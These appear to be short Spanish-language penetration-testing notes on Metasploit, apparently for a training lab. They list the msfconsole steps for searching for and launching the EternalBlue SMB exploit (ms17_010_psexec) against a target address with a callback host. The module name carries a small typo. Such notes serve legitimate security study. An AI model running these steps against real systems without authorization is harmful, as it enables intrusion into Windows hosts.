# Metasploit
Una de las herramientas más potentes en pruebas de penetración. Contiene miles de exploits, payloads, módulos de escaneo y post-explotación.

comandos:
	abrir:
		`msfconsole`
	Buscar exploits por nombre o CVE:
		`search exploit eternalblue`
	Usar un módulo:
		`use exploit/windows/smb/ms17_010_psexe`c
	Configurar opciones necesarias:
		`set RHOSTS 10.10.10.40`
		`set LHOST tun0`
	Verificar si es vulnerable (si el módulo lo permite):
		`check`
	Ejecutar el exploit
		`exploit`



